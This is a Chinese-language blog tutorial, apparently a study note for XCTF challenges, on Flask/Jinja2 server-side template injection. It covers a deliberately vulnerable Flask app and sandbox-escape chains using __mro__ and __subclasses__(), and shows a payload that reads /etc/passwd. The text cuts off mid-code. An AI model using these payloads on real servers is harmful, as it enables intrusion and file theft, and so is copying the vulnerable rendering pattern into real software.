<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python Flask 服务端模板注入(SSTI)</title>
      <link href="post/202104172133.html"/>
      <url>post/202104172133.html</url>
      
        <content type="html"><![CDATA[<p>与SQL注入、XSS等安全漏洞一样，SSTI（Server Site Template Injection）也是因为对用户输入过滤不当导致的，当然还有其他原因，如今的动态站点都会用到模板渲染，这就会有SSTI的风险。</p><p>Python服务端模板注入是相对Flask框架而言的，之前并没有用过该Web框架，是在做XCTF中碰到这类漏洞相关题目，于是现学现卖，写一篇SSTI的学习总结，顺便写出XCTF中两道与该漏洞相关题目的WriteUp</p><h3 id="一、Flask基础"><a href="#一、Flask基础" class="headerlink" title="一、Flask基础"></a>一、Flask基础</h3><p>Flask是python中的一个轻量级Web框架，能够很轻易搭建一个Web站点，使用Jinja2作为模板引擎。</p><p>所谓模板引擎就是在动态站点中，将显示内容和用户数据分离，不同用户查看同一页面返回的是自己的用户数据通过模板渲染后的页面内容，所以一般模板文件都是标准的HTML文件。</p><p>Flask默认的Jinja2引擎存在以下三种语法：</p><ul><li><p> 控制结构 <code>&#123;% %&#125;</code> </p></li><li><p> 变量取值 <code>&#123;&#123; &#125;&#125;</code> </p></li><li><p>注释 <code>&#123;# #&#125;</code> </p><p>使用 <strong><code>&#123;&#123; &#125;&#125;</code></strong> 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换 。<strong>如果 <code>&#123;&#123; &#125;&#125;</code> 中的内容是用户可控的，那么输入的恶意数据就会带入并执行，造成SSTI。</strong></p></li></ul><p>下面是一个简单的模板文件示例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flask<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>name：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>age：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所以在上边的模板文件中，当进行渲染时就会将查询/传入的name和age进行替换，再输出到页面。</p><p>在Flask中有以下两种方式进行渲染：</p><ul><li><p>render_template_string(str)：直接对str进行渲染</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&lt;h1&gt;name: %s, age: %d&lt;/h1&gt;&quot;</span> % (name, age)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></figure></li><li><p>render_template(file)：调用模板文件file进行渲染</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, name=name, age=age)</span><br></pre></td></tr></table></figure><p>两种渲染方式效果是一样的。</p></li></ul><h3 id="二、SSTI环境搭建及测试"><a href="#二、SSTI环境搭建及测试" class="headerlink" title="二、SSTI环境搭建及测试"></a>二、SSTI环境搭建及测试</h3><p>大致了解Flask相关知识后，搭建一个简单的SSTI漏洞测试环境：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    person = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;7d793037a0760186574b0282f2f435e7&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;name&quot;</span>):</span><br><span class="line">        person[<span class="string">&quot;name&quot;</span>] = request.args.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">        template = <span class="string">&quot;&lt;h2&gt;Hello %s&lt;/h2&gt;&quot;</span> % person[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        template = <span class="string">&quot;&lt;h2&gt;You should set a name!&lt;/h2&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>实现的功能就是GET传参name，然后使用Jinja2做模板渲染，再输出到页面。</p><p>传入正常数据：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898888.png" alt="1603554366898.png"></p><p>传入测试数据：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898897.png" alt="1603554388274.png"></p><p>可见**<code>&#123;&#123;&#125;&#125;`**中的表达式被成功执行，即表示存在SSTI，继续输入**`&#123;&#123;config&#125;&#125;</code>**，即可执行config查看Flask相关配置：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898906.png" alt="1603554475271.png"></p><p>当然SSTI的危害不止于此，利用该漏洞甚至可以达到命令执行、GetShell，这就需要<strong>沙盒逃逸</strong>。</p><h3 id="三、沙盒逃逸"><a href="#三、沙盒逃逸" class="headerlink" title="三、沙盒逃逸"></a>三、沙盒逃逸</h3><p>所谓沙盒/沙箱，其实就是将程序运行在独立的环境中，来减小程序异常（病毒等）时造成的危害，通常沙盒环境都会对环境中的可用的功能做以限制。</p><p>因此，沙盒逃逸即绕过沙盒环境中的种种限制和过滤，拿到主机的权限或shell。</p><p>对于python中SSTI的沙盒逃逸利用，则需要先了解以下知识点：</p><h4 id="1、内建函数"><a href="#1、内建函数" class="headerlink" title="1、内建函数"></a>1、内建函数</h4><p>python内部已经定义并创建了许多函数可供使用，不需要用户再定义，称之为内建函数，比如<code>range()、print()、input()、type()</code>等</p><p>这些可使用的内建函数存储在<code>__builtins__</code>内建对象中，当开启python解释器时程序会自动将该对象导入到命名空间，也就是自动导入该模块（<code>import __builtin__</code>）所以可以直接使用其中的内建函数。</p><p>使用dir()函数查看可使用的内建函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">dir</span>(__builtins__)): print(i)</span><br><span class="line"><span class="comment"># &gt;&gt;&gt; for i in enumerate(__builtins__.__dict__): print(i)</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line">(<span class="number">0</span>, <span class="string">&#x27;ArithmeticError&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;AssertionError&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;AttributeError&#x27;</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;BaseException&#x27;</span>)</span><br><span class="line">(<span class="number">4</span>, <span class="string">&#x27;BufferError&#x27;</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">&#x27;BytesWarning&#x27;</span>)</span><br><span class="line">(<span class="number">6</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>)</span><br><span class="line">(<span class="number">7</span>, <span class="string">&#x27;EOFError&#x27;</span>)</span><br><span class="line">(<span class="number">8</span>, <span class="string">&#x27;Ellipsis&#x27;</span>)</span><br><span class="line">(<span class="number">9</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="string">&#x27;Exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line"></span><br><span class="line">(<span class="number">115</span>, <span class="string">&#x27;open&#x27;</span>)</span><br><span class="line">(<span class="number">116</span>, <span class="string">&#x27;ord&#x27;</span>)</span><br><span class="line">(<span class="number">117</span>, <span class="string">&#x27;pow&#x27;</span>)</span><br><span class="line">(<span class="number">118</span>, <span class="string">&#x27;print&#x27;</span>)</span><br><span class="line">(<span class="number">119</span>, <span class="string">&#x27;property&#x27;</span>)</span><br><span class="line">(<span class="number">120</span>, <span class="string">&#x27;quit&#x27;</span>)</span><br><span class="line">(<span class="number">121</span>, <span class="string">&#x27;range&#x27;</span>)</span><br><span class="line">(<span class="number">122</span>, <span class="string">&#x27;raw_input&#x27;</span>)</span><br><span class="line">(<span class="number">123</span>, <span class="string">&#x27;reduce&#x27;</span>)</span><br><span class="line">(<span class="number">124</span>, <span class="string">&#x27;reload&#x27;</span>)</span><br><span class="line">(<span class="number">125</span>, <span class="string">&#x27;repr&#x27;</span>)</span><br><span class="line">(<span class="number">126</span>, <span class="string">&#x27;reversed&#x27;</span>)</span><br><span class="line">(<span class="number">127</span>, <span class="string">&#x27;round&#x27;</span>)</span><br><span class="line">(<span class="number">128</span>, <span class="string">&#x27;set&#x27;</span>)</span><br><span class="line">(<span class="number">129</span>, <span class="string">&#x27;setattr&#x27;</span>)</span><br><span class="line">(<span class="number">130</span>, <span class="string">&#x27;slice&#x27;</span>)</span><br><span class="line">(<span class="number">131</span>, <span class="string">&#x27;sorted&#x27;</span>)</span><br><span class="line">(<span class="number">132</span>, <span class="string">&#x27;staticmethod&#x27;</span>)</span><br><span class="line">(<span class="number">133</span>, <span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">(<span class="number">134</span>, <span class="string">&#x27;sum&#x27;</span>)</span><br><span class="line">(<span class="number">135</span>, <span class="string">&#x27;super&#x27;</span>)</span><br><span class="line">(<span class="number">136</span>, <span class="string">&#x27;tuple&#x27;</span>)</span><br><span class="line">(<span class="number">137</span>, <span class="string">&#x27;type&#x27;</span>)</span><br><span class="line">(<span class="number">138</span>, <span class="string">&#x27;unichr&#x27;</span>)</span><br><span class="line">(<span class="number">139</span>, <span class="string">&#x27;unicode&#x27;</span>)</span><br><span class="line">(<span class="number">140</span>, <span class="string">&#x27;vars&#x27;</span>)</span><br><span class="line">(<span class="number">141</span>, <span class="string">&#x27;xrange&#x27;</span>)</span><br><span class="line">(<span class="number">142</span>, <span class="string">&#x27;zip&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="2、魔术方法"><a href="#2、魔术方法" class="headerlink" title="2、魔术方法"></a>2、魔术方法</h4><p><code>__dict__</code>：</p><p>类的<code>__dict__</code>里存放类的静态函数、类函数、普通函数、全局变量以及一些内置的属性。<br>对象的<code>__dict__</code>中存储一些self.xxx的一些东西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>:</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.b = <span class="number">2</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">A = Test()</span><br><span class="line">print(Test.__dict__)</span><br><span class="line">print(A.__dict__)</span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line">&#123;<span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;__init__&#x27;</span>: &lt;function Test.__init__ at <span class="number">0x000001D060883D08</span>&gt;, <span class="string">&#x27;fun&#x27;</span>: &lt;function Test.fun at <span class="number">0x000001D060883E18</span>&gt;, <span class="string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="string">&#x27;__dict__&#x27;</span> of <span class="string">&#x27;Test&#x27;</span> objects&gt;, <span class="string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="string">&#x27;__weakref__&#x27;</span> of <span class="string">&#x27;Test&#x27;</span> objects&gt;, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure><p>所以可以利用<code>__dict__</code>方法查看指定类的函数，比如此前的查看所有内建函数：<code>__builtins__.__dict__</code></p><p><code>__globals__</code>和<code>__getattribute__()</code>在参考文章中有详述。</p><h4 id="3、类继承"><a href="#3、类继承" class="headerlink" title="3、类继承"></a>3、类继承</h4><p>python中对一个变量应用<strong>class</strong>方法从一个变量实例化为对象类型后，类有以下三种关于继承关系的方法</p><ul><li><code>__base__</code> //对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法</li><li><code>__mro__</code> //同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过<code>__mro__[-1]</code>可以获取到</li><li><code>__subclasses__()</code> //继承此对象的子类，返回一个列表</li></ul><p>有这些类继承的方法，我们就可以<strong>从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类</strong>，就能使用所有基类下的子类及其方法了。</p><p>比如一个字符串，首先获得其当前类，得到str类；再获得其基类，也就是object类，再获得object类的所有子类，得到以下内容：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__<span class="comment"># 获得当前类</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &quot;&quot;.<span class="title">__class__</span>.<span class="title">__base__</span># 获得基类</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &quot;&quot;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()# 获得基类的所有子类</span></span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;nt.ScandirIterator&#x27;&gt;, &lt;class &#x27;nt.DirEntry&#x27;&gt;, &lt;class &#x27;PyHKEY&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;MultibyteCodec&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;MultibyteStreamReader&#x27;&gt;, &lt;class &#x27;MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;]</span><br></pre></td></tr></table></figure><h4 id="4、利用方式"><a href="#4、利用方式" class="headerlink" title="4、利用方式"></a>4、利用方式</h4><p>综上，沙盒逃逸的利用方式可归纳为以下流程：</p><ul><li><strong>变量 -&gt; 对象 -&gt; 类 -&gt; 基类 -&gt; 所有子类 -&gt; 函数方法</strong></li></ul><p>以读取文件为例，Python2中读取文件在<code>file</code>类中，而python3中取消了该类，分别演示：</p><p><strong>python2：利用file类中的read方法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List&#x27;</span></span><br></pre></td></tr></table></figure><p>当然file类中还有其他方法，比如<code>readline()、write()</code>等都可以利用，查看file类的内置函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 